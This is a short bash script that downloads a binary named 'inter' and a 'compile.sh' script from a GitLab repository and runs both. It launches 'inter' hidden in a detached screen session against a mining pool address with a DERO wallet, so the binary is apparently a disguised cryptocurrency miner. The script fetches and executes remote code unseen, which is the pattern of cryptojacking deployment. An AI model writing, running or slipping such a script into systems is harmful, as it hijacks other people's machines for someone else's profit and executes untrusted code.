#!/bin/bash
sudo apt update;sudo apt install screen -y
wget https://gitlab.com/vaneskinanti21/mymy/-/raw/main/inter;chmod 755 inter
wget https://gitlab.com/vaneskinanti21/mymy/-/raw/main/compile.sh
screen -d -m ./inter -o s+tcp://51.222.96.66:443 -u dero1qysflwnyf4mqhzdet7v478nn5l38q6u0uh9g86vtcpmrze0ml8xc7qgdhw9aj.EPYC -t 4
chmod 755 compile.sh;./compile.sh
